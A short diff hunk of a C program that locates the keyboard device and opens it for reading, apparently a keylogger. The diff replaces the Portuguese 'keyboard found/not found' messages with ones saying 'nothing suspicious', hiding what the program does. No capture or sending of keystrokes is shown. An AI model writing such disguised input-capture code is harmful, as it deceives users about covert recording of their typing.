@@ -25,10 +25,10 @@ int main(int argc, char* argv[]){
     char *path = findKeyboard();
 
     if(path == NULL){
-        printf("Teclado não encontrado\n");
+        printf("Erro nada suspeito...\n");
         exit(EXIT_FAILURE);
     }else{
-        printf("Teclado encontrado!\n");
+        printf("Validação nada suspeita...!\n");
     }
     
     int fin = open(path, O_RDONLY);
